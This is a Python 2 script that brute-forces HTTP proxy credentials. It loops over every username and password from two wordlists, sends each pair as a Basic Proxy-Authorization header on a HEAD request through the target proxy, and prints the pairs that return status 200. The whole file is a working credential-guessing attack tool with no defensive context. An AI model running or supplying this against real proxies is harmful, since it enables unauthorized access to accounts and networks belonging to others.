#!/usr/bin/env python

import sys
import os
import socket
import base64
import argparse
import logging
import threading
import httplib

def main():
    parser = argparse.ArgumentParser(description='Bruteforce HTTP Logins')
    parser.add_argument("-u", "--usrslst", help="File containing the usernames")
    parser.add_argument("-p", "--passlst", help="File containing the passwords")
    parser.add_argument("host", help="IP Address/Hostname of Proxy")
    parser.add_argument("port", help="Port on which the Proxy is listening")
    args = parser.parse_args()
    logger = logging.getLogger("default")

    # Default file names
    if args.usrslst is None:
        args.usrslst = 'users.lst'
    if args.passlst is None:
        args.passlst = 'pass.lst'


    for user in open(args.usrslst):
        #remove newline character
        user = user[:-1]
        for psw in open(args.passlst):
            psw = psw[:-1]
            enc_str = base64.b64encode(user + ':' + psw)
            client = httplib.HTTPConnection(args.host, int(args.port))
            client.putrequest("HEAD", "http://www.google.co.in/")
            client.putheader("Proxy-Authorization", "Basic "+enc_str)
            client.endheaders()
            response = client.getresponse()
            if response.status is 200:
                print "Found match:",user,psw

if __name__ == "__main__":
    main()
